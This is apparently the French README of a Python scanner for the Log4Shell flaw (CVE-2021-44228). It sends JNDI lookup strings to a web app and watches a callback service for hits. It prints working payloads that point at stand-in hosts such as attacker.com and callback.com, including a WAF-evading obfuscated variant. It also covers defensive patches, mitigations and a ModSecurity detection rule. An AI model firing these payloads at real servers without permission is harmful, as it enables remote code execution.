# 🐞 Détecteur-Log4Shell - Scanner de Vulnérabilité Log4j

**Créé par ozGod-sh**

## Description

Détecteur-Log4Shell est un scanner spécialisé pour détecter la vulnérabilité critique CVE-2021-44228 (Log4Shell) dans les applications web. Il injecte des payloads JNDI dans différents points d'entrée et utilise des services de callback externes pour détecter les interactions, indiquant une vulnérabilité potentielle.

## Fonctionnalités

### 🎯 Détection multi-vecteurs
- **Paramètres GET** : Injection dans les paramètres d'URL
- **En-têtes HTTP** : Test des headers couramment vulnérables
- **Corps POST JSON** : Injection dans les données JSON
- **Points d'injection multiples** : Couverture complète des vecteurs d'attaque

### 🔍 Headers testés
- `User-Agent` : Header le plus couramment logué
- `Referer` : Souvent enregistré dans les logs
- `X-Forwarded-For` : Utilisé pour l'IP forwarding
- `X-Api-Version` : Headers d'API personnalisés
- `Authorization` : Tokens et credentials
- `Cookie` : Données de session

## Installation

### Prérequis
- Python 3.6+
- Service de callback externe (interact.sh, Burp Collaborator, etc.)

### Installation des dépendances
```bash
cd Détecteur-Log4Shell
pip install -r requirements.txt
```

### Dépendances
- `requests` : Bibliothèque HTTP pour les requêtes web

## Utilisation

### Syntaxe de base
```bash
python detecteur_log4shell.py -u <URL> -c <CALLBACK_URL>
```

### Options disponibles
- `-u, --url URL` : URL cible à tester (requis)
- `-c, --callback URL` : URL de callback unique pour détecter les interactions (requis)
- `-h, --help` : Affiche l'aide

### Exemples d'utilisation

#### 1. Test avec interact.sh
```bash
python detecteur_log4shell.py -u "https://target.com/api/login" -c "xxxxx.oast.fun"
```

#### 2. Test avec Burp Collaborator
```bash
python detecteur_log4shell.py -u "http://vulnerable-app.com" -c "burp-collaborator-subdomain.burpcollaborator.net"
```

#### 3. Test d'une application interne
```bash
python detecteur_log4shell.py --url "http://192.168.1.100:8080/app" --callback "test123.interact.sh"
```

## Structure des fichiers

```
Détecteur-Log4Shell/
├── detecteur_log4shell.py    # Script principal
├── requirements.txt          # Dépendances Python
└── README.md                # Cette documentation
```

## Logique de fonctionnement

### 1. Génération du payload
```python
def generate_payload(callback_url):
    parsed_url = urlparse(callback_url)
    clean_callback = parsed_url.netloc or parsed_url.path
    return f"${{jndi:ldap://{clean_callback}/a}}"
```

### 2. Test des paramètres GET
```python
requests.get(target_url, params={"param": payload}, timeout=5, verify=False)
```

### 3. Test des en-têtes HTTP
```python
for header in HEADERS_TO_TEST:
    headers = {header: payload}
    requests.get(target_url, headers=headers, timeout=5, verify=False)
```

### 4. Test POST JSON
```python
requests.post(target_url, json={"data": payload}, timeout=5, verify=False)
```

## Cas d'usage

### Tests de pénétration
- **Audit de sécurité** : Vérifier la présence de Log4Shell
- **Tests de régression** : S'assurer que les correctifs sont appliqués
- **Évaluation de risque** : Identifier les applications vulnérables
- **Documentation** : Prouver l'existence de la vulnérabilité

### Gestion des incidents
- **Réponse d'urgence** : Identifier rapidement les systèmes vulnérables
- **Priorisation** : Classer les applications par niveau de risque
- **Validation de correctifs** : Vérifier l'efficacité des patches
- **Surveillance continue** : Monitoring des nouvelles déploiements

## Services de callback

### interact.sh (Gratuit)
```bash
# Obtenir un sous-domaine unique
curl https://interact.sh/
# Utiliser le sous-domaine retourné
python detecteur_log4shell.py -u "https://target.com" -c "xxxxx.interact.sh"
```

### Burp Collaborator (Payant)
```bash
# Utiliser Burp Suite Professional
# Copier l'URL du Collaborator depuis Burp
python detecteur_log4shell.py -u "https://target.com" -c "burp-subdomain.burpcollaborator.net"
```

### Service personnalisé
```python
# Créer son propre serveur de callback
import socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 53))  # Port DNS
server.listen(5)
```

## Exemple de sortie

### Test en cours
```
╔══════════════════════════════════════════════════════════╗
║                                                              ║
║  🐞 Détecteur-Log4Shell v1.0.0                           ║
║                                                              ║
║  Scanner de vulnérabilité Log4Shell (CVE-2021-44228).       ║
║  Créé par ozGod                                           ║
║                                                              ║
╚══════════════════════════════════════════════════════════╝

[*] Payload généré : ${jndi:ldap://xxxxx.interact.sh/a}
[*] URL de callback : xxxxx.interact.sh

[*] Test de l'URL : https://target.com/api/login
  - Test des paramètres GET...
  - Test des en-têtes HTTP...
  - Test du corps POST (JSON)...

[*] Scan terminé.
[!] IMPORTANT: Veuillez vérifier votre service de callback (xxxxx.interact.sh) pour toute interaction DNS ou HTTP.
    Si une interaction est détectée, le site est probablement vulnérable.
```

### Vérification des interactions
```bash
# Vérifier interact.sh
curl https://interact.sh/poll/xxxxx

# Vérifier dans Burp Collaborator
# Aller dans l'onglet Collaborator et vérifier les interactions
```

## Payload JNDI expliqué

### Structure du payload
```
${jndi:ldap://attacker.com/exploit}
│  │    │                      │
│  │    │                      └─ Chemin de l'exploit
│  │    └─ Serveur LDAP malveillant
│  └─ Protocole JNDI
└─ Délimiteur Log4j
```

### Variantes de payload
```python
# LDAP
"${jndi:ldap://callback.com/a}"

# RMI
"${jndi:rmi://callback.com/a}"

# DNS (pour détection uniquement)
"${jndi:dns://callback.com/a}"

# Avec contournement de WAF
"${jndi:ldap://callback.com/a}"
"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://callback.com/a}"
```

## Détection et validation

### Signes d'une application vulnérable
1. **Interaction DNS** : Résolution du domaine de callback
2. **Connexion LDAP** : Tentative de connexion au serveur LDAP
3. **Requête HTTP** : Téléchargement de classe Java
4. **Exécution de code** : Exécution de payload malveillant

### Validation manuelle
```bash
# Vérifier les logs du serveur web
tail -f /var/log/apache2/access.log | grep "jndi"

# Monitorer les connexions réseau
netstat -an | grep :389  # Port LDAP

# Analyser le trafic réseau
tcpdump -i any host callback.com
```

## Versions affectées

### Log4j vulnérables
- **2.0-beta9** à **2.14.1** : Vulnérables
- **2.15.0** : Partiellement corrigée (CVE-2021-45046)
- **2.16.0** : Correction complète recommandée
- **2.17.0+** : Versions sécurisées

### Applications couramment affectées
- **Elasticsearch** : Versions utilisant Log4j vulnérable
- **Apache Solr** : Moteur de recherche
- **Apache Struts** : Framework web Java
- **Spring Boot** : Applications avec Log4j
- **Minecraft** : Serveurs Java Edition

## Contre-mesures

### Correctifs immédiats
```bash
# Mise à jour Log4j
# Dans pom.xml (Maven)
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.0</version>
</dependency>
```

### Mitigations temporaires
```bash
# Désactiver les lookups JNDI
-Dlog4j2.formatMsgNoLookups=true

# Supprimer la classe JndiLookup
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### Protection WAF
```bash
# Règles ModSecurity
SecRule ARGS "@detectXSS" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'Log4Shell Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    t:none,\
    t:urlDecodeUni,\
    t:htmlEntityDecode,\
    t:normalisePathWin,\
    chain"
SecRule MATCHED_VAR "@rx (?i)\$\{jndi:"
```

## Limitations

### Détection passive
- **Pas d'exploitation** : Ne fait que détecter, n'exploite pas
- **Callback requis** : Nécessite un service externe
- **Faux négatifs** : Peut manquer certaines configurations
- **Réseau** : Peut être bloqué par des firewalls

### Couverture
- **Points d'injection limités** : Ne teste que les vecteurs courants
- **Pas de bypass WAF** : N'inclut pas de techniques d'évasion
- **Timeout court** : Peut manquer les réponses lentes
- **Pas de persistance** : Ne sauvegarde pas les résultats

## Améliorations futures

### Fonctionnalités avancées
- Support de multiples payloads et protocoles
- Techniques de bypass WAF intégrées
- Détection automatique des interactions
- Rapport détaillé avec preuves

### Interface
- Mode batch pour plusieurs URLs
- Interface graphique
- Intégration avec des scanners existants
- Export des résultats

## Outils complémentaires

### Scanners automatisés
- **log4j-scan** : Scanner Python plus avancé
- **Nuclei** : Templates pour Log4Shell
- **Nessus** : Plugin commercial
- **OpenVAS** : Scanner open source

### Services de callback
- **interact.sh** : Service gratuit
- **Burp Collaborator** : Solution professionnelle
- **Canarytokens** : Tokens de détection
- **DNSlog** : Services DNS logging

## Sécurité et éthique

⚠️ **Utilisation responsable uniquement**
- Testez uniquement vos propres applications ou avec autorisation écrite
- Ne pas exploiter les vulnérabilités trouvées
- Signaler les vulnérabilités aux propriétaires
- Respecter les lois locales sur la cybersécurité

## Licence

MIT License - Voir le fichier LICENSE pour plus de détails.

---

**Détecteur-Log4Shell v1.0.0** | Créé par ozGod-sh